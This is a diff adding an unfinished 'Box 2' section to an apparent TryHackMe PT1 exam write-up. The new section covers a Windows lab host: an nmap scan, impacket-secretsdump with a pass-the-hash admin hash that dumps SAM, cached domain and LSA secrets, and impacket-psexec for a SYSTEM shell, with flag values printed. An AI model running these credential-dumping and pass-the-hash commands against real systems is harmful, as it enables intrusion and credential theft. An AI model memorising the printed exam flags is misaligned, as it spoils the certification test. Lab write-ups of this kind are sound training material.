@@ -9,7 +9,7 @@ image:
   path: room_image.png
 ---
 
-> THIS IS NOT DETAIL WRITE UP BUT YOU FEEL LIKE COMPLETE😊ALSO SOME SCREENSHOTS ARE NOT AVALIBLE BUT YOU CAN UNDERSTAND
+> THIS IS NOT DETAIL And Complete WRITE UP BUT YOU FEEL LIKE COMPLETE😊ALSO SOME SCREENSHOTS ARE NOT AVALIBLE BUT YOU CAN UNDERSTAND 
 {: .prompt-tip }
 ## TryHackMe PT1 Certification Overview
 
@@ -171,5 +171,114 @@ THM{ad3bbf7b-a8e4-40de-b839-91ba91329eb5}
 ```
 Final Flag Obtained: `THM{ad3bbf7b-a8e4-40de-b839-91ba91329eb5}`
 
-BOX 1 DONE
+## Box 2: Active Directory Exploitation (Windows)
+> NOTE : THIS IS NOT COMPLETE WRITEUP PLEASE DONT MINE ME I FORGET TO GET THE SNAPSHOTS PLEASE DONT MIND ONECE I GET COMPLTE ANY TIME I WILL COMPLTE IT😒
+{: .prompt-tip }
 
+This target involved traditional Windows penetration testing techniques, including SMB enumeration, credential cracking, and privilege escalation via `SeBackupPrivilege`.
+
+## Reconnaissance
+```console
+$ nmap -sCV -p- -T4 10.200.150.20 -oN 10.200.150.20.txt
+Starting Nmap 7.92 ( https://nmap.org ) at 2025-06-07 10:15 EDT
+Nmap scan report for 10.200.150.20
+Host is up (0.00030s latency).
+Not shown: 65532 closed tcp ports (conn-refused)
+PORT     STATE SERVICE      VERSION
+445/tcp  open  microsoft-ds Windows 10 Pro 17763 (SMBv3)
+3389/tcp open  ms-rdp       Microsoft Terminal Services
+5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.45 seconds
+```
+
+
+## GET ROOT FLAG
+```console
+$ impacket-secretsdump './Administrator@10.200.150.20' -hashes 'aad3b435b51404eeaad3b435b51404ee:a0f3ae0237d82a4c8f0734ffb173ad92'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xfa0661c3eee8696eeb436f2bafa060e7
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a0f3ae0237d82a4c8f0734ffb173ad92:
+::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089
+c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:95f2822ae7e725c8e30b2b31f
+66c1b86:::
+[*] Dumping cached domain logon information (domain/username:hash)
+TRYHACKME.LOC/Administrator:$DCC2$10240#Administrator#a7e2fe9b84ad21469644db1
+10814763a: (2025-04-18 14:42:26)
+tryhackme.loc/john:$DCC2$10240#john#5c80a200de9612f2fd848d94c71d4f18: (2025-04-18
+21:51:52)
+TRYHACKME.LOC/g.knowles:$DCC2$10240#g.knowles#68f04fdbfffb8f8939144ed65514783
+d: (2025-04-18 15:42:36)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC
+TRYHACKME\WRK$:aes256-cts-hmac-sha1-
+96:a3462833dd5996c3585a0204105bb02286dbd9b01dced91da664cfb0d1e34937
+TRYHACKME\WRK$:aes128-cts-hmac-sha1-96:5835111876430eb6dc4a19d1599c82f8
+TRYHACKME\WRK$:des-cbc-md5:6d947a161f3ec701
+TRYHACKME\WRK$:plain_password_hex:266ed970670d287e4beaa7931155c10d6db3810a73
+68969b6f19a39d27be8f700e3dfdc0b853b6197f5079e393052b155cb0701fe8d26c8eac6357d8d6f
+51f5a4939a307553856940eb6f286c8df2281e298c888f1ed5c33042ac5dba419cf432857a6d02f91
+fa904d5661d3a7946cd046d4681795d35d8bb352ecd9288ed8460057df0dd50129e921412147646
+c868f49efc966d26fef4a2674e080990a28473ee171fdb81e38cc7807153679295ffe0c0bfec709fb2
+6e7307e9a066b3d16f6ea1cd3925fd66486a04b6cc7a0580f9b6725d09f83fa5e61991c60553e57ea
+9fe07a77f4202a4fac75012a9a4ac49ec6
+TRYHACKME\WRK$:aad3b435b51404eeaad3b435b51404ee:78a5ee5e45c83a692d5925acac66
+8699:::
+[*] DPAPI_SYSTEM
+dpapi_machinekey:0x9117806e84e766de5f0e796deb3d789eb9eede6c
+dpapi_userkey:0x67e8753ee98e5cc0e9ac98f9373549a0bbee1091
+[*] NL$KM
+0000 F8 5C 8B ED 35 A3 E4 51 57 3F 89 BD 1C BF 37 CD .\..5..QW?....7.
+0010 6D E2 9A DB FE 79 81 78 5A C5 4F CC 27 04 60 89 m....y.xZ.O.'.`.
+0020 64 BB F4 89 67 64 4F 3B F1 A4 AB CF 16 0A 5F 89 d...gdO;......_.
+0030 8C 7A AC 46 79 1F F1 A7 3E FD 72 61 9F B1 FA AC .z.Fy...>.ra....
+NL$KM:f85c8bed35a3e451573f89bd1cbf37cd6de29adbfe7981785ac54fcc2704608964bbf48967
+644f3bf1a4abcf160a5f898c7aac46791ff1a73efd72619fb1faac
+[*] Cleaning up...
+[*] Stopping service RemoteRegistry
+impacket-psexec './administrator@10.200.150.20' -hashes
+'aad3b435b51404eeaad3b435b51404ee:a0f3ae0237d82a4c8f0734ffb173ad92'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+[*] Requesting shares on 10.200.150.20.....
+[*] Found writable share ADMIN$
+[*] Uploading file AbhAxFRT.exe
+[*] Opening SVCManager on 10.200.150.20.....
+[*] Creating service roqC on 10.200.150.20.....
+[*] Starting service roqC.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+```
+
+```console
+$ impacket-psexec './administrator@10.200.150.20' -hashes 'aad3b435b51404eeaad3b435b51404ee:a0f3ae0237d82a4c8f0734ffb173ad92'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+[*] Requesting shares on 10.200.150.20.....
+[*] Found writable share ADMIN$
+[*] Uploading file AbhAxFRT.exe
+[*] Opening SVCManager on 10.200.150.20.....
+[*] Creating service roqC on 10.200.150.20.....
+[*] Starting service roqC.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.17763.737]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Windows\system32> cd C:\User
+The system cannot find the path specified.
+C:\Windows\system32> cd C:\Users\Administrator\Desktop
+C:\Users\Administrator\Desktop> type flag.txt
+THM{58b41573-062b-42ea-b312-dd5b7cc27671}
+C:\Users\Administrator\Desktop>
+```
+![brup](08.png){: width="1200" height="600"}
+Found Flag 1 : `THM{58b41573-062b-42ea-b312-dd5b7cc27671}`
+
+
+### THERE IS NO COMPLETE WRITEUPS I WILL ATTEND AGAIN AND COMPLTE THIS 😒
